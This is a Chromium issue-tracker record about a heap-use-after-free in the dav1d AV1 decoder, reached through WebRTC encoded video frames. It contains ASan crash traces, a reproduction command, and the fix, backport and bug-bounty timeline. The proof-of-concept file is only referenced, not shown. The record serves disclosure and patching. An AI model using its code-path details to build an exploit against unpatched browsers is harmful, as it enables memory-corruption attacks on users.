    #3 0x7fd7698edcbc in blink::RTCEncodedVideoFrameDelegate::SetData(blink::DOMArrayBuffer const*) third_party/blink/renderer/modules/peerconnection/rtc_encoded_video_frame_delegate.cc:86:20
    #4 0x7fd7698eb6ef in blink::RTCEncodedVideoFrame::PassWebRtcFrame(v8::Isolate*, bool) third_party/blink/renderer/modules/peerconnection/rtc_encoded_video_frame.cc:330:14
    #5 0x7fd7698f67b7 in blink::RTCEncodedVideoUnderlyingSink::write(blink::ScriptState*, blink::ScriptValue, blink::WritableStreamDefaultController*, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/rtc_encoded_video_underlying_sink.cc:79:38
    #6 0x7fd7698e2be5 in blink::RTCEncodedUnderlyingSinkWrapper::write(blink::ScriptState*, blink::ScriptValue, blink::WritableStreamDefaultController*, blink::ExceptionState&) third_party/blink/renderer/modules/peerconnection/rtc_encoded_underlying_sink_wrapper.cc:83:50
    #7 0x7fd781bef6ff in blink::UnderlyingSinkWriteAlgorithm::Run(blink::ScriptState*, base::span<v8::Local<v8::Value>, 18446744073709551615ul, v8::Local<v8::Value>*>) third_party/blink/renderer/core/streams/underlying_sink_base.h:51:12
    #8 0x7fd781c007bd in blink::WritableStreamDefaultController::AdvanceQueueIfNeeded(blink::ScriptState*, blink::WritableStreamDefaultController*) third_party/blink/renderer/core/streams/writable_stream_default_controller.cc:659:63
    #9 0x7fd781c014d6 in blink::WritableStreamDefaultController::Write(blink::ScriptState*, blink::WritableStreamDefaultController*, v8::Local<v8::Value>, double, blink::ExceptionState&) third_party/blink/renderer/core/streams/writable_stream_default_controller.cc:473:3
    #10 0x7fd781c0a749 in blink::WritableStreamDefaultWriter::Write(blink::ScriptState*, blink::WritableStreamDefaultWriter*, v8::Local<v8::Value>, blink::ExceptionState&) third_party/blink/renderer/core/streams/writable_stream_default_writer.cc:452:3
    #11 0x7fd781c09a85 in blink::WritableStreamDefaultWriter::write(blink::ScriptState*, blink::ScriptValue, blink::ExceptionState&) third_party/blink/renderer/core/streams/writable_stream_default_writer.cc:280:10
    #12 0x7fd783247717 in blink::(anonymous namespace)::v8_writable_stream_default_writer::WriteOperationCallback(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_writable_stream_default_writer.cc:311:32

SUMMARY: AddressSanitizer: heap-use-after-free third_party/dav1d/libdav1d/src/msac.c:52:25 in dav1d_msac_init
Shadow bytes around the buggy address:
  0x7ce75394b600: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ce75394b680: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ce75394b700: fa fa fa fa fa fa f7 fa 00 00 00 00 00 00 00 00
  0x7ce75394b780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ce75394b800: 00 00 00 00 fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x7ce75394b880: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd
  0x7ce75394b900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa
  0x7ce75394b980: fa fa fa fa fa fa f7 fa 00 00 00 00 00 00 00 00
  0x7ce75394ba00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ce75394ba80: 00 00 00 00 fa fa fa fa fa fa fa fa fa fa f7 fa
  0x7ce75394bb00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==1753512==ADDITIONAL INFO

==1753512==Note: Please include this section with the ASan report.
Task trace:
    #0 0x7fd7b904dcfe in webrtc::internal::VideoReceiveStream2::OnEncodedFrame(std::__Cr::unique_ptr<webrtc::EncodedFrame, std::__Cr::default_delete<webrtc::EncodedFrame>>) third_party/webrtc/video/video_receive_stream2.cc:823:18
    #1 0x7fd7b89dfc2a in webrtc::RtpVideoStreamReceiverFrameTransformerDelegate::OnTransformedFrame(std::__Cr::unique_ptr<webrtc::TransformableFrameInterface, std::__Cr::default_delete<webrtc::TransformableFrameInterface>>) third_party/webrtc/modules/rtp_rtcp/source/rtp_video_stream_receiver_frame_transformer_delegate.cc:175:20


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==1753512==ABORTING

```
## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Attachments

- [asan.log](attachments/asan.log) (text/plain, 37.5 KB)
- [poc.html](attachments/poc.html) (text/html, 18.0 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6121329996529664.

### 24...@project.gserviceaccount.com (2026-02-23)

Testcase 6121329996529664 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6121329996529664.

### an...@chromium.org (2026-02-23)

tommi, hta: can you PTAL? Clusterfuzz wasn't able to repro but the reporter has included ASAN traces of their own.

### aj...@google.com (2026-02-27)

This repros with a renderer asan crash followed by a bad-message kill.

`run-chrome-asan --no-first-run --disable-extensions --no-sandbox --enable-logging --log-file=d:\temp\asan.log --autoplay-policy=no-user-gesture-required D:\pocs\comesatime-486421953\poc.html`

```
==38244==ERROR: AddressSanitizer: heap-use-after-free on address 0x12426eacc3f9 at pc 0x7ff9dafa6b1c bp 0x0091763fe2f0 sp 0x0091763fe338
READ of size 1 at 0x12426eacc3f9 thread T5
[44852:39884:0227/110053.578:INFO:CONSOLE:25] "[worker] Sent chunk2 (288B) via keyframe slot (frame 5) -> UAF should trigger", source: file:///D:/pocs/comesatime-486421953/poc.html (25)
[44852:32600:0227/110056.510:ERROR:google_apis\gcm\engine\registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
    #0 0x7ff9dafa6b1b in dav1d_msac_init D:\chromium\src\third_party\dav1d\libdav1d\src\msac.c:213:5
    #1 0x7ff9dafbd232 in dav1d_decode_frame_init_cdf D:\chromium\src\third_party\dav1d\libdav1d\src\decode.c:3170:13
    #2 0x7ff9dafc0686 in dav1d_decode_frame D:\chromium\src\third_party\dav1d\libdav1d\src\decode.c:3290:21
    #3 0x7ff9dafc4023 in dav1d_submit_frame D:\chromium\src\third_party\dav1d\libdav1d\src\decode.c:3698:20
    #4 0x7ff9daf8ed49 in dav1d_parse_obus D:\chromium\src\third_party\dav1d\libdav1d\src\obu.c:1660:24
    #5 0x7ff9dafa0450 in gen_picture D:\chromium\src\third_party\dav1d\libdav1d\src\lib.c:418:31
    #6 0x7ff9dafa0345 in dav1d_send_data D:\chromium\src\third_party\dav1d\libdav1d\src\lib.c:449:15
...
Command line: `"d:\chromium\src\out\Asan\chrome.exe" --type=renderer --user-data-dir="d:\temp\asan-profile" --no-pre-read-main-dll --no-sandbox --autoplay-policy=no-user-gesture-required --enable-blink-features=MojoJS --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=5 --time-ticks-at-unix-epoch=-1771952238365012 --launch-time-ticks=266612091897 --metrics-shmem-handle=3324,i,10478599790132242043,1116155258034286353,2097152 --field-trial-handle=1780,i,8460460938318717578,16661695709144155493,262144 --variations-seed-version --pseudonymization-salt-handle=1848,i,3353038718559057519,2382656810352409516,4 --trace-process-track-uuid=3190708990997080739 --enable-logging=handle --log-file=3300 --mojo-platform-channel-handle=3288 /prefetch:1`

MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.

```

Setting severity High and CC'ing some folks in relevant teams.

### aj...@google.com (2026-02-27)

attaching poc as reporter did not.

### ch...@google.com (2026-02-28)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-28)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must exceed severity.

### dx...@google.com (2026-03-04)

Project: src  

Branch:  main  

Author:  Philip Eliasson [philipel@webrtc.org](mailto:philipel@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/453200>

Let dav1d retain references to wrapped bitstream buffers.

---


Expand for full commit details
```
     
    Bug: chromium:486421953 
    Change-Id: I855616d8206711b371df05a306730468ec8d23e7 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/453200 
    Commit-Queue: Philip Eliasson <philipel@webrtc.org> 
    Reviewed-by: Erik Språng <sprang@webrtc.org> 
    Cr-Commit-Position: refs/heads/main@{#47051}

```

---

Files:

- M `modules/video_coding/codecs/av1/dav1d_decoder.cc`
- M `modules/video_coding/codecs/av1/dav1d_decoder_unittest.cc`

---

Hash: fcea1cf20ab03a15d2ca702629208e965edb3990  

Date: Wed Mar 4 12:51:43 2026


---

### dx...@google.com (2026-03-05)

Project: chromium/src  

Branch:  main  

Author:  chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:    <https://chromium-review.googlesource.com/7635819>

Roll WebRTC from 9b43041fb76a to fcea1cf20ab0 (2 revisions)

---


Expand for full commit details
```
     
    https://webrtc.googlesource.com/src.git/+log/9b43041fb76a..fcea1cf20ab0 
     
    2026-03-04 philipel@webrtc.org Let dav1d retain references to wrapped bitstream buffers. 
    2026-03-04 chromium-webrtc-autoroll@webrtc-ci.iam.gserviceaccount.com Roll chromium_revision 7ff1b6e256..0ae5bdcc6c (1593841:1594043) 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/webrtc-chromium-autoroll 
    Please CC webrtc-chromium-sheriffs-robots@google.com,webrtc-infra@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To file a bug in WebRTC: https://bugs.chromium.org/p/webrtc/issues/entry 
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:486421953 
    Tbr: webrtc-chromium-sheriffs-robots@google.com 
    Change-Id: Ib5bb86613dff6479dc7ba3ed5c92a3de24f28fb5 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7635819 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1594398}

```

---

Files:

- M `DEPS`
- M `third_party/webrtc`

---

Hash: [f80e9dae0ac365664b22c4b2d9500537eb497c8f](https://chromiumdash.appspot.com/commit/f80e9dae0ac365664b22c4b2d9500537eb497c8f)  

Date: Thu Mar 5 02:22:46 2026


---

### ph...@webrtc.org (2026-03-05)

Thank you for an excellent bug description!

I have verified that the poc no longer triggers with the fix landed in [comment#9](https://issues.chromium.org/issues/486421953#comment9), closing the bug.

### ch...@google.com (2026-03-05)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2026-03-05)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1594398) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1594398) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1594398) appears to be after beta branch point (1582197).
Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ph...@google.com (2026-03-06)

1. Which CLs should be backmerged? (Please include Gerrit links.)
   - <https://webrtc-review.googlesource.com/453200>
2. Has this fix been verified on Canary to not pose any stability regressions?
   - No, only verified in a local ASAN build of Chromium so far.
3. Does this fix pose any potential non-verifiable stability risks?
   - Unlikely
4. Does this fix pose any known compatibility risks?
   - -
5. Does it require manual verification by the test team? If so, please describe required testing.
   - Build Canary with ASAN?

### ph...@google.com (2026-03-06)

From reading the [merge criteria phases](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/process/merge_request.md#merge-criteria-phases) I'm not sure if this CL is eligible for merging, it think it depends on whether we consider this issue to be of mediums severity or higher.

### ph...@google.com (2026-03-06)

I have prepared cherry-picks for the various milestones:

Cherry-pick for M144: <https://webrtc-review.googlesource.com/c/src/+/454301>  

Cherry-pick for M145: <https://webrtc-review.googlesource.com/c/src/+/454340>  

Cherry-pich for M146: <https://webrtc-review.googlesource.com/c/src/+/454341>

### dr...@chromium.org (2026-03-07)

No crashes in Canary, approved to merge to M146. We don't plan more M144 or M145 releases, so rejecting those merge requests.

### ch...@google.com (2026-03-07)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-07)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-07)

Merge review required: a commit with DEPS changes was detected.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### dx...@google.com (2026-03-09)

Project: src  

Branch:  refs/branch-heads/7680  

Author:  Philip Eliasson [philipel@webrtc.org](mailto:philipel@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/454341>

Let dav1d retain references to wrapped bitstream buffers.

---


Expand for full commit details
```
     
    (cherry picked from commit fcea1cf20ab03a15d2ca702629208e965edb3990) 
     
    Bug: chromium:486421953 
    Change-Id: I855616d8206711b371df05a306730468ec8d23e7 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/453200 
    Commit-Queue: Philip Eliasson <philipel@webrtc.org> 
    Reviewed-by: Erik Språng <sprang@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47051} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454341 
    Reviewed-by: Johannes Kron <kron@webrtc.org> 
    Cr-Commit-Position: refs/branch-heads/7680@{#1} 
    Cr-Branched-From: d1972add2a63b2a528a6471d447f82e0010b5215-refs/heads/main@{#46853}

```

---

Files:

- M `modules/video_coding/codecs/av1/dav1d_decoder.cc`
- M `modules/video_coding/codecs/av1/dav1d_decoder_unittest.cc`

---

Hash: fe210de7215dc375cba88a42df2715e4a4d6706f  

Date: Wed Mar 4 12:51:43 2026


---

### pe...@google.com (2026-03-09)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### ph...@google.com (2026-03-09)

1. Was this issue a regression for the milestone it was found in?
   - No, the issue was introduced in 2021.
2. Is this issue related to a change or feature merged after the latest LTS Milestone?
   - No, this feature (AV1 decoding with dav1d) has existed since 2021.

### sp...@google.com (2026-03-27)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
Baseline. Renderer RCE / memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-04-02)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-04-02)

1. https://webrtc-review.git.corp.google.com/c/src/+/458560
2. Low - there was no conflict.
3. 144, 145, 146 (Comment #16)
4. Yes, the bug was introduced in 2021.

### an...@google.com (2026-04-03)

Merge approved for LTS-138.

### dx...@google.com (2026-04-08)

Project: src  

Branch:  refs/branch-heads/7204  

Author:  Philip Eliasson [philipel@webrtc.org](mailto:philipel@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/458560>

[M138] Let dav1d retain references to wrapped bitstream buffers.

---


Expand for full commit details
```
     
    (cherry picked from commit fcea1cf20ab03a15d2ca702629208e965edb3990) 
     
    No-try: true 
    Bug: chromium:486421953 
    Change-Id: I855616d8206711b371df05a306730468ec8d23e7 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/453200 
    Commit-Queue: Philip Eliasson <philipel@webrtc.org> 
    Reviewed-by: Erik Språng <sprang@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47051} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/458560 
    Reviewed-by: Philip Eliasson <philipel@webrtc.org> 
    Reviewed-by: Johannes Kron <kron@webrtc.org> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3} 
    Cr-Branched-From: e4445e46a910eb407571ec0b0b8b7043562678cf-refs/heads/main@{#44764}

```

---

Files:

- M `modules/video_coding/codecs/av1/dav1d_decoder.cc`
- M `modules/video_coding/codecs/av1/dav1d_decoder_unittest.cc`

---

Hash: 4bbba1198503ef1c57b9a447723324f4df479b74  

Date: Fri Mar 20 10:20:27 2026


---

### pe...@google.com (2026-05-29)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-05-29)

1. <https://webrtc-review.git.corp.google.com/c/src/+/454301>
2. Low - There was no conflict.
3. 144, 145, and 146
4. Yes, the bug was introduced in 2021.

### dx...@google.com (2026-06-04)

Project: src  

Branch:  refs/branch-heads/7559  

Author:  Philip Eliasson [philipel@webrtc.org](mailto:philipel@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/454301>

[M144-LTS] Let dav1d retain references to wrapped bitstream buffers.

---


Expand for full commit details
```
     
    (cherry picked from commit fcea1cf20ab03a15d2ca702629208e965edb3990) 
     
    No-try: True 
    Bug: chromium:486421953 
    Change-Id: I855616d8206711b371df05a306730468ec8d23e7 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/453200 
    Commit-Queue: Philip Eliasson <philipel@webrtc.org> 
    Reviewed-by: Erik Språng <sprang@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47051} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454301 
    Cr-Commit-Position: refs/branch-heads/7559@{#8} 
    Cr-Branched-From: f680c1893f3b166b370439da52ae82d02f54969c-refs/heads/main@{#46356}

```

---

Files:

- M `modules/video_coding/codecs/av1/dav1d_decoder.cc`
- M `modules/video_coding/codecs/av1/dav1d_decoder_unittest.cc`

---

Hash: 84c2b92b12f2834d289b07f62c4f420dc6d83d9b  

Date: Wed Mar 4 12:51:43 2026


---

### ch...@google.com (2026-06-12)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/486421953)*
